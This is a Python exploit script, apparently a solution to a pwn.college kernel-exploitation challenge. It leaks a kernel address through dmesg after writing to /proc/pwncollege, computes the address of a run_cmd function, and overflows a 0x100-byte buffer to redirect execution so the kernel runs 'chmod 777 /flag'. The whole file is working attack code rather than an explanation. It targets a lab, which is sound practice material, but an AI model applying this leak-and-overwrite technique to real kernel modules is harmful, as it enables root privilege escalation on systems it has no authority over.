import subprocess
import struct

from time import sleep

BUF = 0x100
INIT_LEAK = 0xffffffffb32b69a9
RUN_CMD =   0xffffffffb3289b30
OFFSET = INIT_LEAK - RUN_CMD

def dmesg(payload):
    try:
        process = subprocess.run(['dmesg'], capture_output=True, text=True)  
        for line in process.stdout.splitlines():
            if payload in line:
                return line
    except FileNotFoundError:
        print("Error: dmesg command not found.", file=sys.stderr)
    except OSError as e:
        print(f"Error running dmesg: {e}", file=sys.stderr)


def get_leak():
    payload = b"A"*BUF

    with open('/proc/pwncollege', 'wb') as f:
        f.write(payload)

    leak = dmesg(payload.decode()).split(' ')[-1].replace(payload.decode(), '')
    hex_bytes = leak.encode('latin-1').decode('unicode_escape').encode('latin-1')[::-1]
    address = int.from_bytes(hex_bytes, byteorder='big', signed=False)
    print(hex_bytes)
    print(hex(address))
    return hex_bytes


def exploit(run_cmd_addr):
    addr = struct.pack("<Q", run_cmd_addr)
    print(addr.hex())

    cmd = b"/usr/bin/chmod 777 /flag"
    padding = b"\0"*((0x100)-len(cmd))
    shellcode = cmd + padding + addr

    with open('/proc/pwncollege', 'wb') as f:
        f.write(shellcode)

    for i in range(5):
        try:
            with open('/flag', 'r') as f:
                print(f.read())
            exit()
        except PermissionError:
            sleep(1)


if __name__ == '__main__':
    sleep(1)
    leak = get_leak()
    run_cmd = int.from_bytes(leak, byteorder='big', signed=False) - OFFSET
    print(hex(OFFSET))
    print(hex(run_cmd))
    exploit(run_cmd)
